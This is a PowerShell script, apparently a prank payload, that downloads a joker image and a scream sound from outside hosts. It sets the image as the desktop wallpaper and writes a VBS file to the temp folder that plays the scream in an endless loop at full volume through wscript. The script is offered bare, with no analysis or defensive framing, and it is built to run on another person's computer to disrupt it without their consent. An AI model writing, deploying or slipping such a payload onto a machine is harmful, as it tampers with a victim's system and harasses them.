# Define Paths
$picturesFolder = "$env:USERPROFILE\Pictures"
$imgPath = Join-Path $picturesFolder "joker.jpg"
$soundPath = Join-Path $picturesFolder "scream.wav"
$vbsPath = "$env:TEMP\bgSound.vbs"

# Create folder if needed
if (!(Test-Path $picturesFolder)) {
    New-Item -ItemType Directory -Path $picturesFolder | Out-Null
}

# Download wallpaper
Invoke-WebRequest -Uri "https://wallpapercave.com/wp/wp4528934.jpg" -OutFile $imgPath

# Download scary WAV sound
Invoke-WebRequest -Uri "https://github.com/sahilcipher/payloads/raw/refs/heads/main/girl_scream-6465.wav" -OutFile $soundPath

# Set wallpaper
Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $imgPath, 0x01 -bor 0x02)

# Create VBS script to play sound in loop silently
$vbsContent = @"
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "$soundPath"
oPlayer.settings.setMode "loop", True
oPlayer.settings.volume = 100
oPlayer.controls.play
Do While True
    WScript.Sleep 1000
Loop
"@

# Save the VBS script
$vbsContent | Out-File -Encoding ASCII $vbsPath

# Run VBS in background (sound loop)
Start-Process "wscript.exe" -ArgumentList ""$vbsPath""
